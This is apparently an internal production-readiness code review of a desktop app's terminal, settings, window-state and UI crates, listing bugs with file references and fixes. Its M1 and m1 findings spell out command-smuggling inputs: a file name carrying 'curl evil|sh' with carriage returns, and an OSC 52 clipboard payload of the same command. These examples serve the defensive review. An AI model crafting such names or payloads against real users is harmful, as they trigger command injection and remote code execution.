# Production-readiness review 2: crates skipped by the first review

Date: 2026-11-16. Read-only (no builds, no tests run). Follows `2026-11-16-production-review.md`.
Scope: `app/desktop/crates/{sidebar,settings_ui,command_palette,ui,tab_bar,layout_view,startup_view,pairing_view,remote_folder_picker,branch_import_view,window_state,terminal,oobe_view}` (about 65k lines).
Depth: these are large and mostly UI. I swept all of them with grep for panics, unchecked slicing, spawns, timers, filesystem and process use, then read the risky units in full: `terminal` (feed, paste, search, resolve_path, dropped_paths, events), `terminal_view` (drop, link, session), `ui` text buffer/history/toast queue, `window_state`, `sidebar` (preferences, removal timer, icon editor, file drop), `settings_ui` document and write path, `pairing_view`, `remote_folder_picker` rows, `startup_view` machine, `command_palette` fuzzy match. Rendering code in `tab_bar`, `layout_view`, `oobe_view` and `branch_import_view` was only skimmed. Absence of a finding there is not a clean bill.

## Overall

These crates are in good shape. Every `unwrap`/`expect`/`panic!` outside `#[cfg(test)]` and `src/bin` demo binaries is absent (all hits were inside test modules). The text buffer clamps offsets to char boundaries before `replace_range`. The state machines (`StartupMachine`, `Document`, `RemovalTray`) are pure and take time as a parameter. No process spawns, network I/O or `unsafe` in these crates. Findings below are the real gaps; none is a blocker.

No blockers.

## MAJOR

### M1. Dropped file names are typed into the PTY raw, so a crafted file name can execute commands
- `terminal/src/dropped_paths.rs:19-35` (`quote`), `terminal_view/src/terminal_view.rs:155-166` (`on_drop` -> `send_text`).
- `quote` double-quotes names that contain whitespace or `" \ $ `` '` and escapes `" \ $ `` `. It does not touch control characters or `!`. The result goes through `send_text`, not through `encode_paste` bracketed mode.
- Failure scenario: a downloaded archive contains a file named `x<CR>curl evil|sh<CR>` (Linux allows CR and ESC in names). The user drags it onto a terminal at a shell prompt. The quoted text includes a literal CR, which readline treats as Enter, so the command runs. `\x1b` and `\x03`/`\x04` can also be injected. In bash/zsh interactive mode `!` inside double quotes triggers history expansion.
- Fix: refuse (skip) any path containing a control character (`char::is_control`), single-quote with `'\''` escaping instead of double quotes (no `$`, `!`, backtick issues), and send the result with bracketed paste when the program enabled it. Add a table test case with CR, ESC, `!`.

### M2. Active search rescans the whole scrollback on every output frame
- `terminal/src/terminal.rs:86-93` (`apply` calls `search.refresh`), `terminal/src/search_state.rs:59-76` (`collect` over `topmost_line..bottommost_line`, up to 100k scrollback lines by `settings_ui/src/catalog/terminal.rs:16`).
- Failure scenario: the user leaves the find bar open with a short query and runs `cat bigfile` or a build with fast output. Each daemon frame runs a regex over up to 100k lines on the UI thread, so the shell freezes. `MAX_MATCHES` bounds the result, not the scan.
- Fix: coalesce refreshes to once per render/frame (a dirty flag consumed by the view, not a timer), or search only the changed range plus a visible-window cap. Add a benchmark next to `benches/bulk_output.rs` with search active.

## MINOR

### m1. OSC 52 lets any program overwrite the clipboard silently and without a size limit
- `terminal_view/src/terminal_view_session.rs:60-62`, `terminal/src/event_sink.rs:27`.
- Scenario: `cat` of a hostile file, or output from a remote ssh session, replaces the clipboard with `curl evil|sh`; the user pastes later. A huge payload also costs memory.
- Fix: gate on a setting (default off, or ask once per pane), cap length (for example 64 KiB), and show a toast when it fires.

### m2. Unbounded event queue within one frame
- `terminal/src/event_sink.rs:23-33`, `terminal/src/terminal.rs:95-100`.
- A single large `Output` frame full of OSC 0 or BEL pushes one `Event` (with a `String`) per sequence before `drain_events` runs, then emits one `TitleChanged` per entry. Memory spike and event storm.
- Fix: collapse in the sink: keep only the last title, a bell flag, and a capped clipboard value.

### m3. Terminal queries are dropped
- `terminal/src/event_sink.rs:27` keeps only four event kinds, so `PtyWrite` (DA, DSR/CPR, colour queries) never reaches the daemon.
- Scenario: vim, fish or `tput` ask the terminal for cursor position or device attributes and wait for the reply, then time out. I did not verify whether the daemon answers these itself; if it does, this is fine and should be stated in a comment (1 line). If not it is a correctness bug.

### m4. Settings write is a synchronous call on the UI thread, with a per-key "unsaved" marker
- `settings_ui/src/run_intent.rs:63-72` calls `settings.set` inline; `settings_ui/src/document.rs:49-77` tracks `unsaved` per key, not per write.
- If `set` ever blocks (IPC to the daemon), typing in a number field freezes the window. If writes become asynchronous, an acknowledge for write 1 clears the guard while write 2 is in flight, so a remote echo can overwrite the optimistic value and a failure of write 2 would no longer roll back. Today it is correct only because `set` is synchronous.
- Fix: keep the contract documented (3 lines) or key `unsaved` by a write sequence number before making writes async.

### m5. Window state accepts any finite or infinite size and NaN
- `window_state/src/window_state.rs:28-42`, `window_store.rs:25-35`.
- A hand-edited or corrupted file with `width: 1e30` (or `inf`) opens a window that the platform rejects or that spans all displays; `NaN` bounds pass `max` and `x` unchanged. `placement` only enforces a minimum.
- Fix: reject non-finite values on load (`Error::Corrupt`) and clamp to the largest display size.

### m6. Undo history clones the whole buffer 200 times; no input length cap
- `ui/src/text_history.rs:9-31`, `ui/src/text_buffer.rs`.
- Pasting a very large text into a `TextInput`/`TextArea` and then typing stores up to 200 full copies (also `undo.remove(0)` is O(n)). Memory grows to 200 times the paste size.
- Fix: cap input length (inputs are names, addresses, codes) and store edits as deltas or use a `VecDeque` with a byte budget.

### m7. Toast queue has no cap on pinned toasts
- `ui/src/toast_queue.rs:45-48,86-108`. Each `push` adds an entry with its own expiry task; pinned toasts never expire. A producer in a loop (for example a repeated failure notice using `push` instead of `show(key)`) grows the list and layout cost without bound.
- Fix: cap entries (drop the oldest non-pinned, then the oldest) or require keyed `show` for recurring notices.

### m8. Pairing dialog cannot be cancelled while a request is pending
- `pairing_view/src/pairing_view.rs:150-175` (`dismiss` and `step_back` return early unless `idle`).
- If the host is unreachable and the transport has no timeout shorter than the OS default, Escape does nothing and the user cannot leave the dialog for minutes. Verify the session has a bounded timeout in `shell_data::PairingSession`; otherwise let dismiss cancel the pending call.

### m9. Fuzzy match lowercases the query and the text differently
- `command_palette/src/fuzzy_match.rs:27-35`. The query uses `flat_map(to_lowercase)` (full expansion) while the text keeps only the first lowercase char, so characters like `İ` expand differently, and `positions` may index a different character than the one highlighted. Not a panic (all accesses use `get`), only a wrong highlight or a missed match.
- Fix: use the same function on both sides.

### m10. Remote folder tree recomputes children by a linear scan per open folder, every render
- `remote_folder_picker/src/folder_rows.rs:13-26,64-90`. `children_of` is O(entries) per expanded folder, so rows cost O(open folders times entries) per frame; `FILE_CAP` limits files only. With a large listing (such as `node_modules`) and several open folders the picker lags.
- Fix: index children by parent once per listing arrival, not per render.

## Manifest check (docs/rabbyte-manifest.md)

- Rule 44 (500 lines): `layout_view/src/drop_target.rs` is 509 lines in total but about 190 non-test lines, so it complies under the Rust note. Largest non-test files: `terminal/src/terminal.rs` 407, `settings_ui/src/settings_state.rs` 452, `sidebar/src/demo_data.rs` 439, `sidebar/src/file_menu.rs` 219. All under 500. `terminal.rs` at 407 and `settings_state.rs` at 452 are near the ceiling (rule 45); split before they grow.
- Rule 7/lint suppressions: every `#![allow]` seen has a `reason`. The blanket crate-level `clippy::too_many_arguments` allow in `terminal/src/lib.rs:12-16` conflicts with its own stated reason ("four-parameter limit") and with rule 1 as a design smell; prefer fixing the signatures or allowing at the item.
- Rule 33 (no boolean flag parameters): `sidebar/src/hover_glide.rs` and `ui/src/toast_queue.rs` take `&bool`/flags in closures; the touched constructors in the sampled files otherwise avoid boolean flags. Not exhaustive.
- Rule 37 (dead code): `sidebar::DemoData` is exported publicly behind the `fixtures` feature and used by `sidebar_gallery`; acceptable, but it is a 489-line fixture in a production crate (demo data should live in the gallery or `test_support`).
- Rule 41 (no real infrastructure in tests): `sidebar/src/preferences.rs:172-201` writes real files in tests (with `expect` and manual cleanup); use a temp dir guard so a failed assertion does not leak the file.

## Not reviewed in depth

`tab_bar`, `layout_view`, `oobe_view`, `branch_import_view` rendering and drag math (`strip_drag.rs`, `sash_grab.rs`, `drop_target.rs`), `sidebar` row drag/menus, most of `settings_ui` catalog/shortcut capture, and `ui` element painting. Drag handlers should get a second look for state with two owners (drag state in `tab_bar::drag_session` versus `layout_view::tab_seat`), which I did not trace end to end.
